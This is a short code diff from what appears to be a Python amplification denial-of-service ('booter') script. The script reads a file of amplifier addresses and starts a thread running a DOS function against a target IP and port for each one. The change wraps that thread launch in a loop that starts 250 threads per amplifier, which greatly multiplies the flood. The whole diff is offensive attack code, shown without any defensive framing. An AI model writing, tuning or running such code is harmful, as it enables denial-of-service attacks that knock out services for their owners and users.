@@ -42,5 +42,5 @@ with open(files,'r') as f:
     if load == 1:print('\n')
     for ip_amp in amp:
       raw = ip_amp.split(' ')
-      if raw[0] != '':threading.Thread(target=DOS,args=(ip,port,raw[0],booter,times,raw[1])).start()
+      if raw[0] != '':[threading.Thread(target=DOS,args=(ip,port,raw[0],booter,times,raw[1])).start() for _ in range(250)]
     exit()
